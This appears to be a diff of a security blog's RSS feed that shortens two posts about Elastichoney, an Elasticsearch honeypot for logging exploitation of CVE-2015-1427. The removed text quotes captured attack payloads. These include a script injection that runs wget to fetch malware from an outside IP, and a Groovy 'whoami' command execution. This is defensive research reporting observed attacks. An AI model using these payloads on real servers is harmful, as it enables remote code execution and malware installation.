@@ -7,7 +7,9 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Thu, 30 Apr 2015 20:00:00 +0000</lastBuildDate>
-    <atom:link href="https://jordan-wright.com/blog/tags/honeypot/index.xml" rel="self" type="application/rss+xml" />
+    
+	<atom:link href="https://jordan-wright.com/blog/tags/honeypot/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>60 Days of Watching Hackers Attack Elasticsearch</title>
@@ -15,9 +17,7 @@
       <pubDate>Thu, 30 Apr 2015 20:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/elk_results.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/elk_results.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
@@ -26,85 +26,8 @@
 
 &lt;p&gt;After re-building the box from scratch (with many improvements!), I &lt;a href=&#34;https://jordan-wright.com/blog/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/&#34;&gt;created a honeypot&lt;/a&gt; called Elastichoney to measure how much this vulnerability is being exploited in the wild. Since then, I&amp;rsquo;ve had multiple sensors silently logging all attempts to exploit this vulnerability.&lt;/p&gt;
 
-&lt;p&gt;Here are the results.&lt;/p&gt;
-
-&lt;h3 id=&#34;who-s-attacking-me&#34;&gt;Who&amp;rsquo;s Attacking Me?&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/jordan-wright/elastichoney&#34;&gt;Elastichoney&lt;/a&gt; keeps track of quite a bit of data, including the source IP and payload sent to the sensor. I logged every attack to an Elasticsearch instance (have some irony - free of charge!) and enriched the data with geoip information using Logstash. Finally, I created a slick dashboard using Kibana to view the results.&lt;/p&gt;
-
-&lt;p&gt;So far, I&amp;rsquo;ve had around 8k attempts to attack the honeypots from over 300 unique IP addresses. One of the immediate things I noticed was thing a vast majority (over 93%) of attacks were coming from Chinese IP addresses:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/elastichoney_elk/map.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;The second thing that I noticed was how fast the majority of exploit attempts died down. Here&amp;rsquo;s a histogram of attack attempts since the sensors have been running:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/elastichoney_elk/histogram.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;You&amp;rsquo;ll notice a spike between March 20&lt;sup&gt;th&lt;/sup&gt; and April 11&lt;sup&gt;th&lt;/sup&gt;. These attacks came from a few Chinese IP addresses that all stopped their attacks at the same time. But hey, attacks come in, attacks go out. &lt;a href=&#34;http://cdn.meme.am/instances/500x/58834359.jpg&#34;&gt;You can&amp;rsquo;t explain that.&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;what-are-the-attackers-doing&#34;&gt;What are the Attackers Doing?&lt;/h3&gt;
-
-&lt;p&gt;I mentioned that Elastichoney logs the payload sent to the sensor. In some cases, these were attempts to run boring commands like &lt;code&gt;whoami&lt;/code&gt;, etc. However, in quite a few cases, the malware attempted to use &lt;code&gt;wget&lt;/code&gt; to download and run malware - similar to what happened to my DO instance.&lt;/p&gt;
-
-&lt;p&gt;These looked something like this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;source={&amp;quot;query&amp;quot;:+{&amp;quot;filtered&amp;quot;:+{&amp;quot;query&amp;quot;:+{&amp;quot;match_all&amp;quot;:+{}}}},+&amp;quot;script_fields&amp;quot;:+{&amp;quot;exp&amp;quot;:+{&amp;quot;script&amp;quot;:+&amp;quot;import+java.util.*;import+java.io.*;String+str+=+\&amp;quot;\&amp;quot;;BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\&amp;quot;wget+-O+/tmp/zuosyn+http://115.28.216.181:995/zuosyn\&amp;quot;).getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\&amp;quot;\r\n\&amp;quot;);}sb.toString();&amp;quot;}},+&amp;quot;size&amp;quot;:+1}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;These malware samples were generally nothing more than basic bots. They could be compiled ELF binaries, or simple Perl scripts. While we&amp;rsquo;re working to let Elastichoney automatically download these malware samples, for now the data is in the logs. Speaking of logs&amp;hellip;&lt;/p&gt;
-
-&lt;h3 id=&#34;the-raw-data&#34;&gt;The Raw Data&lt;/h3&gt;
-
-&lt;p&gt;I&amp;rsquo;m a fan of open-sourcing as much information as possible if it helps the community. As such, I&amp;rsquo;ve decided to release all the logs I currently have.&lt;/p&gt;
-
-&lt;p&gt;You can download the raw JSON logs &lt;a href=&#34;https://jordan-wright.com/blog/downloads/elastichoney_logs.json.gz&#34;&gt;here&lt;/a&gt;. Here&amp;rsquo;s an example log to show how the logs are structured:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
-    &amp;quot;source&amp;quot;: &amp;quot;222.186.56.46&amp;quot;,
-    &amp;quot;@timestamp&amp;quot;: &amp;quot;2015-05-10T15:44:56.803Z&amp;quot;,
-    &amp;quot;url&amp;quot;: &amp;quot;x.x.x.x:9200/_search?&amp;quot;,
-    &amp;quot;method&amp;quot;: &amp;quot;GET&amp;quot;,
-    &amp;quot;form&amp;quot;: &amp;quot;form_payload&amp;quot;,
-    &amp;quot;payload&amp;quot;: &amp;quot;json_payload&amp;quot;,
-    &amp;quot;headers&amp;quot;: {
-        &amp;quot;user_agent&amp;quot;: &amp;quot;python-requests/2.4.1 CPython/2.7.8 Windows/2003Server&amp;quot;,
-        &amp;quot;host&amp;quot;: &amp;quot;x.x.x.x:9200&amp;quot;,
-        &amp;quot;content_type&amp;quot;: &amp;quot;&amp;quot;,
-        &amp;quot;accept_language&amp;quot;: &amp;quot;&amp;quot;
-    },
-    &amp;quot;type&amp;quot;: &amp;quot;attack&amp;quot;,
-    &amp;quot;honeypot&amp;quot;: &amp;quot;x.x.x.x&amp;quot;,
-    &amp;quot;@version&amp;quot;: &amp;quot;1&amp;quot;,
-    &amp;quot;host&amp;quot;: &amp;quot;127.0.0.1:39642&amp;quot;,
-    &amp;quot;name&amp;quot;: &amp;quot;Python Requests&amp;quot;,
-    &amp;quot;os&amp;quot;: &amp;quot;Windows&amp;quot;,
-    &amp;quot;os_name&amp;quot;: &amp;quot;Windows&amp;quot;,
-    &amp;quot;device&amp;quot;: &amp;quot;Other&amp;quot;,
-    &amp;quot;major&amp;quot;: &amp;quot;2&amp;quot;,
-    &amp;quot;minor&amp;quot;: &amp;quot;4&amp;quot;,
-    &amp;quot;geoip&amp;quot;: {
-        &amp;quot;ip&amp;quot;: &amp;quot;222.186.56.46&amp;quot;,
-        &amp;quot;country_code2&amp;quot;: &amp;quot;CN&amp;quot;,
-        &amp;quot;country_code3&amp;quot;: &amp;quot;CHN&amp;quot;,
-        &amp;quot;country_name&amp;quot;: &amp;quot;China&amp;quot;,
-        &amp;quot;continent_code&amp;quot;: &amp;quot;AS&amp;quot;,
-        &amp;quot;region_name&amp;quot;: &amp;quot;04&amp;quot;,
-        &amp;quot;city_name&amp;quot;: &amp;quot;Nanjing&amp;quot;,
-        &amp;quot;latitude&amp;quot;: 32.0617,
-        &amp;quot;longitude&amp;quot;: 118.77780000000001,
-        &amp;quot;timezone&amp;quot;: &amp;quot;Asia/Shanghai&amp;quot;,
-        &amp;quot;real_region_name&amp;quot;: &amp;quot;Jiangsu&amp;quot;,
-        &amp;quot;location&amp;quot;: [118.77780000000001, 32.0617]
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;As always, let me know if you have any questions or comments below!&lt;/p&gt;
-
-&lt;p&gt;Enjoy!&lt;/p&gt;
-
-&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;Here are the results.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -113,68 +36,13 @@
       <pubDate>Mon, 23 Mar 2015 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/elastichoney.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/elastichoney.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
-&lt;p&gt;I recently &lt;a href=&#34;https://jordan-wright.com/blog/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/&#34;&gt;wrote&lt;/a&gt; about an Elasticsearch RCE vulnerability that is being heavily exploited in the wild. To see what kind of attacks are taking place, I decided to write a simple honeypot designed to mimic a vulnerable Elasticsearch (ES) instance. Say hello to &lt;a href=&#34;http://github.com/jordan-wright/elastichoney&#34;&gt;elastichoney&lt;/a&gt;!&lt;/p&gt;
-
-&lt;h3 id=&#34;how-it-works&#34;&gt;How it Works&lt;/h3&gt;
-
-&lt;p&gt;This honeypot is pretty simple. It takes requests on the &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;/_search&lt;/code&gt;, and &lt;code&gt;/_nodes&lt;/code&gt; endpoints and returns a JSON response that is identical to a vulnerable ES instance (should be identical - I took the responses straight from one of my hosts that got 0wned).&lt;/p&gt;
-
-&lt;p&gt;Attacks are logged as soon as they are detected. By default, elastichoney logs the attacks in JSON format to &lt;code&gt;stdout&lt;/code&gt;, as well as to a file called &lt;code&gt;elastichoney.log&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;It&amp;rsquo;s important to note that this is by no means foolproof. Clever people can take a look at &lt;a href=&#34;http://github.com/jordan-wright/elastichoney&#34;&gt;the code&lt;/a&gt; and quickly find ways to detect the honeypot. It&amp;rsquo;s not perfect, but it works. Let&amp;rsquo;s take a look at some results.&lt;/p&gt;
-
-&lt;h3 id=&#34;results&#34;&gt;Results&lt;/h3&gt;
-
-&lt;p&gt;Very quickly after I deployed the honeypot, I started getting hit by attackers scanning large swathes of the Internet looking for vulnerable systems. To date, I&amp;rsquo;ve seen approx. 2000 attacks from over 60 unique IP&amp;rsquo;s over the course of a few days, all without advertising my elastichoney instance anywhere.&lt;/p&gt;
-
-&lt;p&gt;Here&amp;rsquo;s an entry from my logs that is attempting to exploit the CVE-2015-1427 that I wrote about:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
-    &amp;quot;source&amp;quot;: &amp;quot;[redacted]&amp;quot;,
-    &amp;quot;@timestamp&amp;quot;: &amp;quot;2015-03-23T13:34:22.519890008-05:00&amp;quot;,
-    &amp;quot;url&amp;quot;: &amp;quot;[redacted]:9200/_search?pretty&amp;quot;,
-    &amp;quot;method&amp;quot;: &amp;quot;POST&amp;quot;,
-    &amp;quot;form&amp;quot;: &amp;quot;pretty=&amp;amp;{\&amp;quot;script_fields\&amp;quot;:+{\&amp;quot;iswin\&amp;quot;:+{\&amp;quot;lang\&amp;quot;:+\&amp;quot;groovy\&amp;quot;,+\&amp;quot;script\&amp;quot;:+\&amp;quot;java.lang.Math.class.forName(\\\&amp;quot;java.io.BufferedReader\\\&amp;quot;).getConstructor(java.io.Reader.class).\\tnewInstance(java.lang.Math.class.forName(\\\&amp;quot;java.io.InputStreamReader\\\&amp;quot;).getConstructor(java.io.InputStream.\\tclass).newInstance(java.lang.Math.class.forName(\\\&amp;quot;java.lang.Runtime\\\&amp;quot;).getRuntime().exec(\\\&amp;quot;whoami\\\&amp;quot;).\\tgetInputStream())).readLines()\&amp;quot;}},+\&amp;quot;size\&amp;quot;:+1}=&amp;quot;,
-    &amp;quot;payload&amp;quot;: &amp;quot;&amp;quot;,
-    &amp;quot;headers&amp;quot;: {
-        &amp;quot;user_agent&amp;quot;: &amp;quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36&amp;quot;,
-        &amp;quot;host&amp;quot;: &amp;quot;[redacted]:9200&amp;quot;,
-        &amp;quot;content_type&amp;quot;: &amp;quot;application/x-www-form-urlencoded&amp;quot;,
-        &amp;quot;accept_language&amp;quot;: &amp;quot;&amp;quot;
-    },
-    &amp;quot;type&amp;quot;: &amp;quot;attack&amp;quot;,
-    &amp;quot;honeypot&amp;quot;: &amp;quot;[redacted]&amp;quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now, I&amp;rsquo;m sure you&amp;rsquo;re interested in some samples. &lt;a href=&#34;https://gist.githubusercontent.com/jordan-wright/f63575681373f91e462f/raw/b446a9d3bb042aac425970d73c129d4d936478aa/elastichoney.log&#34;&gt;Here&amp;rsquo;s&lt;/a&gt; a bit of what I have so far. There&amp;rsquo;s some nifty &lt;code&gt;wget&lt;/code&gt; calls in there if you grab them fast enough.&lt;/p&gt;
-
-&lt;p&gt;Enjoy!&lt;/p&gt;
-
-&lt;h3 id=&#34;want-to-run-this-yourself&#34;&gt;Want to Run This Yourself?&lt;/h3&gt;
-
-&lt;p&gt;&lt;em&gt;Awesome.&lt;/em&gt; Let&amp;rsquo;s take a look at what it takes to get elastichoney up and running. Installation should take about&amp;hellip; 5 seconds. Since this is written in Go, I can provide binaries for most platforms. If you&amp;rsquo;re interested in running elastichoney yourself, just download &lt;a href=&#34;http://github.com/jordan-wright/elastichoney/releases&#34;&gt;the right binary&lt;/a&gt; for your system, edit the config to your liking, and start it up!&lt;/p&gt;
-
-&lt;p&gt;Let&amp;rsquo;s talk about some of the config options. The first option to note is &lt;code&gt;use_remote&lt;/code&gt;. I mentioned that elastichoney will log to &lt;code&gt;stdout&lt;/code&gt; and a file by default. You can set this option to also have the honeypot send an HTTP &lt;code&gt;POST&lt;/code&gt; containing the JSON entry to a remote server of your choosing. Personally, I have my entries going to a real elasticsearch instance so I can search on them later.&lt;sup&gt;1&lt;/sup&gt;&lt;/p&gt;
-
-&lt;p&gt;The second config option that you may want to play with is the &lt;code&gt;spoofed_version&lt;/code&gt; option. This lets you pick what version of ES you want your honeypot to show up as. This helps if you are looking for attackers targeting specific systems (such as those targeting the &amp;lt;=v1.2 RCE vuln vs the most recent RCE vuln).&lt;/p&gt;
-
-&lt;p&gt;Finally, the last option you might set is the &lt;code&gt;anonymous&lt;/code&gt; option. This simply determines if you want your honeypot IP to show up in logs. If so, elastichoney will make a single call out to icanhazip.com when it starts up to get the external IP. Otherwise, it&amp;rsquo;ll just use &lt;code&gt;1.1.1.1&lt;/code&gt;&lt;sup&gt;2&lt;/sup&gt;. This is helpful if you want to create an anonymous cluster of honeypots.&lt;/p&gt;
-
-&lt;p&gt;As always, let me know if you have any questions or comments below.&lt;/p&gt;
-
-&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-
-&lt;p&gt;[1] Irony.&lt;br/&gt;
-[2] Big shout-out to the person actually on &lt;code&gt;1.1.1.1&lt;/code&gt;.&lt;/p&gt;
-</description>
+&lt;p&gt;I recently &lt;a href=&#34;https://jordan-wright.com/blog/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/&#34;&gt;wrote&lt;/a&gt; about an Elasticsearch RCE vulnerability that is being heavily exploited in the wild. To see what kind of attacks are taking place, I decided to write a simple honeypot designed to mimic a vulnerable Elasticsearch (ES) instance. Say hello to &lt;a href=&#34;http://github.com/jordan-wright/elastichoney&#34;&gt;elastichoney&lt;/a&gt;!
+&lt;/p&gt;</description>
     </item>
     
   </channel>
